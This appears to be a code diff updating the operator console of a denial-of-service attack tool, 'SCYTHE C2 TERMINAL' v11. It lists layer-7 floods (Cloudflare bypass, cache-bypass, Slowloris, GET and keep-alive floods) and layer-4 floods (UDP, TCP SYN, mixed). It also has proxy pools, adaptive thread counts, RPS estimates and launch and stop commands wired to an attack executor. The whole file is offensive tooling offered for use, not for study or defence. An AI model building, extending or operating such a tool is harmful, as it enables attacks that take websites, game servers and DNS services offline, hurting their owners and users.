@@ -2,11 +2,11 @@
 # -*- coding: utf-8 -*-
 """
 ╔═══════════════════════════════════════════════════════════════════════════════╗
-║  SCYTHE C2 TERMINAL v10.0 — UPDATED METHODS & PROFESSIONAL BOXES            ║
+║  SCYTHE C2 TERMINAL v11.0 — FIXED BOX + SYNC WITH NEW ENGINE                ║
 ║  🔥 LAYER 7: 6 METHODS (httpbypass, cf-flood, slow, httpget, httpflood, auto)║
 ║  🔥 LAYER 4: 4 METHODS (udp, tcp, mixed, slowloris)                         ║
-║  🔥 ATTACK BOX: Detailed info + Est. RPS + Proxy + Threads                  ║
-║  🔥 ALL BOXES: Professional ASCII art with colors                           ║
+║  🔥 ATTACK BOX: Dynamic width, more info                                    ║
+║  🔥 ALL BOXES: Fixed bottom border, professional                            ║
 ║  Built for: Alpha @scytheinhere88                                            ║
 ╚═══════════════════════════════════════════════════════════════════════════════╝
 """
@@ -22,7 +22,7 @@ import atexit
 from datetime import datetime
 from collections import deque
 
-# ─── FIX: readline with fallback ───
+# ─── READLINE ───
 try:
     import readline
     READLINE_AVAILABLE = True
@@ -35,42 +35,33 @@ except ImportError:
         def get_history_item(self, *args): return None
     readline = DummyReadline()
 
-# ─── IMPORT STATE MANAGER ───
+# ─── IMPORTS ───
 try:
     from state_manager import state, MAX_CONCURRENT, MAX_HOLD_TIME
 except ImportError as e:
-    print("[FATAL] state_manager.py not found. Run setup.sh first.")
+    print("[FATAL] state_manager.py not found.")
     sys.exit(1)
 
-# ─── IMPORT ATTACK EXECUTOR ───
 try:
     from attack_executor import AttackExecutor, get_vps_specs, calculate_rps_estimate, get_adaptive_threads
-    # We will override METHODS below
     from attack_executor import METHODS as ORIGINAL_METHODS
 except ImportError as e:
-    print("[FATAL] attack_executor.py not found. Run setup.sh first.")
+    print("[FATAL] attack_executor.py not found.")
     sys.exit(1)
 
-# ─── OVERRIDE METHODS WITH NEW STRUCTURE ───
+# ─── OVERRIDE METHODS ───
 METHODS = {
-    # LAYER 7 - 6 METHODS
-    "httpbypass":  {"layer": 7, "type": "py", "engine": "l7", "desc": "Header spoofing + multiplexing", "target": "Cloudflare, Akamai"},
+    "httpbypass":  {"layer": 7, "type": "py", "engine": "l7", "desc": "CF bypass + header spoofing", "target": "Cloudflare, Akamai"},
     "cf-flood":    {"layer": 7, "type": "py", "engine": "l7", "desc": "CF header manipulation + cache bypass", "target": "Cloudflare"},
-    "slow":        {"layer": 7, "type": "py", "engine": "l7", "desc": "Slowloris connection hold (partial requests)", "target": "Apache, nginx"},
+    "slow":        {"layer": 7, "type": "py", "engine": "l7", "desc": "Slowloris connection hold", "target": "Apache, nginx"},
     "httpget":     {"layer": 7, "type": "py", "engine": "l7", "desc": "Standard GET flood with random paths", "target": "Any HTTP server"},
-    "httpflood":   {"layer": 7, "type": "py", "engine": "l7", "desc": "Keep-alive connections with multiple requests", "target": "Load balancers"},
-    "auto":        {"layer": 7, "type": "py", "engine": "l7", "desc": "Auto-switch between methods (adaptive)", "target": "Any"},
-    # LAYER 4 - 4 METHODS
-    "udp":         {"layer": 4, "type": "py", "engine": "l4", "desc": "UDP datagram flood (high bandwidth)", "target": "Game servers, DNS"},
-    "tcp":         {"layer": 4, "type": "py", "engine": "l4", "desc": "TCP SYN flood (connection exhaustion)", "target": "Web servers"},
-    "mixed":       {"layer": 4, "type": "py", "engine": "l4", "desc": "UDP + TCP mixed flood (adaptive)", "target": "Firewalls, generic"},
-    "slowloris":   {"layer": 4, "type": "py", "engine": "l4", "desc": "TCP connection hold (Slowloris at L4)", "target": "Apache, nginx"},
+    "httpflood":   {"layer": 7, "type": "py", "engine": "l7", "desc": "Keep-alive connections, multiple requests", "target": "Load balancers"},
+    "auto":        {"layer": 7, "type": "py", "engine": "l7", "desc": "Auto-switch methods (adaptive)", "target": "Any"},
+    "udp":         {"layer": 4, "type": "py", "engine": "l4", "desc": "UDP datagram flood", "target": "Game servers, DNS"},
+    "tcp":         {"layer": 4, "type": "py", "engine": "l4", "desc": "TCP SYN flood", "target": "Web servers"},
+    "mixed":       {"layer": 4, "type": "py", "engine": "l4", "desc": "UDP + TCP mixed", "target": "Firewalls"},
+    "slowloris":   {"layer": 4, "type": "py", "engine": "l4", "desc": "TCP connection hold (L4 Slowloris)", "target": "Apache, nginx"},
 }
-
-# ─── UPDATE IMPORTED EXECUTOR'S METHODS TOO (optional) ───
-# We'll just use our local METHODS for display, but executor still uses its own.
-# However attack_executor's METHODS should also be updated for consistency.
-# We'll assume user will update attack_executor separately.
 
 # ─── COLORS ───
 class C:
@@ -85,7 +76,6 @@ class C:
     X  = "\033[0m"
     CL = "\033[2J\033[H"
 
-# ─── SESSION LOGGING ───
 SESSION_LOG = "c2_session.log"
 COMMAND_HISTORY = deque(maxlen=1000)
 SESSION_START = datetime.now()
@@ -98,7 +88,6 @@ def log_session(message, level="INFO"):
     except:
         pass
 
-# ─── AUTHENTICATION ───
 AUTH_CODE = "654654"
 MAX_ATTEMPTS = 3
 
@@ -136,7 +125,6 @@ def authenticate():
             return False
     return False
 
-# ─── BANNER ───
 BANNER = (
     C.P + C.B +
     "\n" +
@@ -149,7 +137,7 @@ BANNER = (
     "    ═══════════ D E F I N E D  B Y  S I L E N C E D ════════════\n" +
     C.G + "\n" + """
     ╔═══════════════════════════════════════════════════════════════════════════════╗
-    ║  C2 COMMAND & CONTROL  —  MAXIMIZED EDITION v10.0                           ║
+    ║  C2 COMMAND & CONTROL  —  MAXIMIZED EDITION v11.0                           ║
     ║  [MAX CONCURRENT: """ + str(MAX_CONCURRENT) + """]  [MAX HOLD: """ + str(MAX_HOLD_TIME) + """s]  [AUTO-PROXY]  ║
     ║  [ADAPTIVE THREADS: ON]  [RPS: LIVE — MAXIMIZED]  [SYNC: DASHBOARD]         ║
     ║  [METHODS: """ + str(len(METHODS)) + """ (6 L7 + 4 L4)]  [AUTH: ON]  [LOGGING: ON]  [HISTORY: ON]  ║
@@ -200,7 +188,6 @@ class CommandHistory:
         self.index = max(self.index - 1, 0)
         return self.history[-self.index] if self.index > 0 else ""
 
-# ─── AUTO-COMPLETE ───
 class TabCompleter:
     def __init__(self):
         self.commands = list(METHODS.keys()) + [
@@ -220,26 +207,56 @@ if READLINE_AVAILABLE:
     completer = TabCompleter()
     readline.set_completer(completer.complete)
 
-# ─── ASCII BOX UTILITIES ───
-def box(title, lines, color=C.G, width=78):
-    """Draw a fancy ASCII box with centered title and lines"""
+# ─── BOX UTILITIES (with dynamic width) ───
+def box(title, lines, color=C.G, width=None, padding=4):
+    """Draw a fancy ASCII box with dynamic width based on content"""
+    if width is None:
+        # Calculate max line length
+        max_len = len(title) + 2
+        for line in lines:
+            if isinstance(line, tuple):
+                # For tuple, combine label and value
+                if len(line) >= 2:
+                    label = line[0]
+                    value = line[1] if len(line) > 1 else ""
+                    text = f" {label}: {value}"
+                else:
+                    text = str(line[0])
+            else:
+                text = str(line)
+            # Strip color codes for length calculation
+            clean = re.sub(r'\x1b\[[0-9;]*m', '', text)
+            max_len = max(max_len, len(clean) + 2)
+        width = max_len + padding * 2
+        width = max(70, min(width, 120))  # antara 70-120 karakter
+
     print(color + "╔" + ("═" * width) + "╗" + C.X)
-    print(color + "║" + C.B + title.center(width) + C.X + color + "║" + C.X)
+    # Title
+    title_pad = (width - len(title)) // 2
+    print(color + "║" + " " * title_pad + C.B + title + C.X + " " * (width - len(title) - title_pad) + color + "║" + C.X)
     print(color + "╠" + ("═" * width) + "╣" + C.X)
     for line in lines:
-        if isinstance(line, tuple) and len(line) == 3:
-            label, value, val_color = line
-            text = " " + label + ": " + val_color + str(value) + C.X
-        elif isinstance(line, tuple) and len(line) == 2:
-            text = " " + line[0] + ": " + C.D + str(line[1]) + C.X
+        if isinstance(line, tuple):
+            if len(line) == 3:
+                label, value, val_color = line
+                text = f" {label}: {val_color}{value}{C.X}"
+            elif len(line) == 2:
+                label, value = line
+                text = f" {label}: {C.D}{value}{C.X}"
+            else:
+                text = f" {line[0]}"
         else:
             text = str(line)
-        print(color + "║" + text.ljust(width) + color + "║" + C.X)
+        # Strip color codes for length calculation
+        clean = re.sub(r'\x1b\[[0-9;]*m', '', text)
+        # Padding
+        text_len = len(clean)
+        pad_right = width - text_len - 1
+        print(color + "║" + text + " " * pad_right + color + "║" + C.X)
     print(color + "╚" + ("═" * width) + "╝" + C.X)
 
-# ─── ATTACK LAUNCH BOX (PROFESSIONAL) ───
+# ─── BOXES ───
 def attack_box(method, target, port, duration, hold_time, proxy_count, attack_id, rps_estimate, threads, layer):
-    """Display detailed attack launch info with professional box"""
     info = METHODS.get(method, {})
     lines = [
         ("Method", method.upper(), C.P),
@@ -255,13 +272,12 @@ def attack_box(method, target, port, duration, hold_time, proxy_count, attack_id
         ("Description", info.get("desc", "N/A")[:60], C.D),
         ("Best For", info.get("target", "N/A")[:60], C.D),
         "",
-        C.B + C.G + " Attack successfully launched!" + C.X,
+        C.G + C.B + " Attack successfully launched!" + C.X,
         C.D + " Use 'ongoing' to monitor real-time RPS and status." + C.X,
     ]
     box(" ⚡ ATTACK LAUNCHED ⚡ ", lines, C.P)
     log_session(f"Attack launched: {method} {target}:{port} {duration}s (ID: {attack_id})", "ATTACK")
 
-# ─── STOP BOX ───
 def stop_box(attack_id, total_req, peak_rps, duration, total_bytes=0):
     lines = [
         ("Attack ID", attack_id, C.C),
@@ -275,7 +291,6 @@ def stop_box(attack_id, total_req, peak_rps, duration, total_bytes=0):
     box(" ATTACK TERMINATED ", lines, C.R)
     log_session(f"Attack stopped: {attack_id} | Requests: {total_req} | Peak RPS: {peak_rps}", "ATTACK")
 
-# ─── PROXY BOX ───
 def proxy_box(proxy_count, total_fetched, refreshing, vps_specs, rps_estimates):
     cpu, ram, disk = vps_specs
     l7_rps, l4_rps = rps_estimates
@@ -297,7 +312,6 @@ def proxy_box(proxy_count, total_fetched, refreshing, vps_specs, rps_estimates):
     ]
     box(" PROXY POOL STATUS ", lines, C.C)
 
-# ─── VPS BOX ───
 def vps_box():
     cpu_count, ram_gb, disk_gb = get_vps_specs()
     lines = [
@@ -320,7 +334,6 @@ def vps_box():
     ]
     box(" VPS SPECIFICATIONS & ADAPTIVE THREADS ", lines, C.Y)
 
-# ─── STATUS BOX ───
 def status_box(data):
     active = data.get("active_attacks", [])
     proxy_pool = data.get("proxy_pool", 0)
@@ -355,7 +368,6 @@ def status_box(data):
         lines.append(" " + C.D + "No active attacks running" + C.X)
     box(" SYSTEM STATUS & ONGOING ATTACKS ", lines, C.C)
 
-# ─── METHODS BOX ───
 def methods_box():
     l7 = [(k, v) for k, v in METHODS.items() if v["layer"] == 7]
     l4 = [(k, v) for k, v in METHODS.items() if v["layer"] == 4]
@@ -369,7 +381,6 @@ def methods_box():
         lines.append(" " + C.P + name.ljust(15) + C.X + " " + C.D + info['desc'][:55] + "..." + C.X)
     box(" LAYER 4 METHODS (" + str(len(l4)) + ") ", lines, C.P)
 
-# ─── HELP BOX ───
 def help_box():
     lines = [
         C.B + " UNIFIED ATTACK SYNTAX:" + C.X,
@@ -422,7 +433,6 @@ def help_box():
     ]
     box(" SCYTHE C2 COMMAND REFERENCE ", lines, C.G)
 
-# ─── STATS BOX ───
 def stats_box():
     active = state.state.get("active_attacks", [])
     history = state.state.get("attack_history", [])
@@ -451,7 +461,6 @@ def stats_box():
 
     box(" PERFORMANCE STATISTICS ", lines, C.P)
 
-# ─── LOG BOX ───
 def log_box():
     try:
         if os.path.exists(SESSION_LOG):
@@ -505,24 +514,19 @@ class CommandHandler:
                         pass
                     break
 
-            # Auto-add https for L7
             if METHODS[cmd]["layer"] == 7 and not target.startswith("http"):
                 target = "https://" + target
 
-            # Get info for box
             layer = METHODS[cmd]["layer"]
             proxy_count = self.executor.get_proxy_count()
             threads = get_adaptive_threads(cmd, int(time_val))
             l7_rps, l4_rps = calculate_rps_estimate(proxy_count, len(state.state["active_attacks"]) + 1)
             rps_estimate = l7_rps if layer == 7 else l4_rps
 
-            # Execute via executor (this will also add to state and return attack_id)
             success = self.executor.execute(cmd, target, port, time_val, hold_time)
             if success:
-                # Get attack ID from state (last added)
                 active = state.state["active_attacks"]
                 attack_id = active[-1]["id"] if active else "unknown"
-                # Display attack box
                 attack_box(
                     method=cmd,
                     target=target,
@@ -540,8 +544,12 @@ class CommandHandler:
         # ─── SYSTEM COMMANDS ───
         if cmd == "help":
             help_box()
-        elif cmd == "methods":
+        elif cmd == "methods" or cmd == "l7" or cmd == "layer7":
             methods_box()
+        elif cmd == "l4" or cmd == "layer4":
+            l4 = [(k, v) for k, v in METHODS.items() if v["layer"] == 4]
+            lines = [" " + C.P + k.ljust(15) + C.X + " " + C.D + v['desc'][:55] + "..." + C.X for k, v in l4]
+            box(" LAYER 4 METHODS (" + str(len(l4)) + ") ", lines, C.P)
         elif cmd == "ongoing":
             status_box(state.get_state())
         elif cmd == "proxy":
@@ -556,14 +564,6 @@ class CommandHandler:
             )
         elif cmd == "vps":
             vps_box()
-        elif cmd == "layer7":
-            l7 = [(k, v) for k, v in METHODS.items() if v["layer"] == 7]
-            lines = [" " + C.G + k.ljust(15) + C.X + " " + C.D + v['desc'][:55] + "..." + C.X for k, v in l7]
-            box(" LAYER 7 METHODS (" + str(len(l7)) + ") ", lines, C.G)
-        elif cmd == "layer4":
-            l4 = [(k, v) for k, v in METHODS.items() if v["layer"] == 4]
-            lines = [" " + C.P + k.ljust(15) + C.X + " " + C.D + v['desc'][:55] + "..." + C.X for k, v in l4]
-            box(" LAYER 4 METHODS (" + str(len(l4)) + ") ", lines, C.P)
         elif cmd == "stop":
             if len(parts) > 1:
                 self.executor.stop_attack(parts[1])
@@ -599,7 +599,6 @@ class CommandHandler:
 
         return True
 
-# ─── SAVE HISTORY ON EXIT ───
 def save_history_on_exit():
     try:
         if os.path.exists(".c2_history"):
